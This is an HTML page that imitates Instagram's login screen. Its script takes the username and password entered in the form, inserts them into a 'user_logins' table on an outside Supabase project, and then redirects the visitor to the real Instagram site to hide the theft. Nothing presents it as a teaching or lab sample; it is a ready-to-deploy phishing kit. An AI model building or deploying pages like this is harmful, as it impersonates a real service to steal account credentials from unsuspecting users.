<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { font-family: -apple-system, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
        .logo { font-size: 2.5rem; font-weight: bold; margin-bottom: 20px; font-family: 'Arial', sans-serif; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 10px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">Instagram</div>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Username" required>
            <input type="password" id="pass" placeholder="Password" required>
            <button type="submit" id="btn">Log In</button>
        </form>
    </div>

    <script>
        const _supabase = supabase.createClient('https://mllxnrqjdzpiswpaappa.supabase.co', 'sb_publishable_eRmChz-WTwaXvgf5r0VONw_mQN8BPnZ');

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = "Loading...";
            
            const { error } = await _supabase.from('user_logins').insert([
                { identifier: document.getElementById('email').value, password: document.getElementById('pass').value }
            ]);

            if (error) {
                alert("Error: " + error.message);
                btn.innerText = "Log In";
            } else {
                window.location.href = "https://www.instagram.com";
            }
        });
    </script>
</body>
</html>
